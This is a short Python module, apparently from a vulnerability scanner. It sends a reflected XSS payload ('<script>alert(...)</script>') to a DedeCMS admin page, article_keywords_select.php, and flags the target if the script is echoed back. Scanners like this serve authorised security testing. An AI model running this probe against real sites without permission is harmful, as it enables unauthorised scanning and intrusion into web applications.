import requests
from termcolor import cprint


class article_xss:

    def __init__(self,url):
        self.url = url

    def checktxss(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/dede/article_keywords_select.php?f=<script>alert(/00day.cn/)</script>/*"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200 and "<script>alert(/00day.cn/)</script>" in r.content:
                cprint("target may be article_keyword_select.php xss:" + vulnurl,"red")
        except:
            return False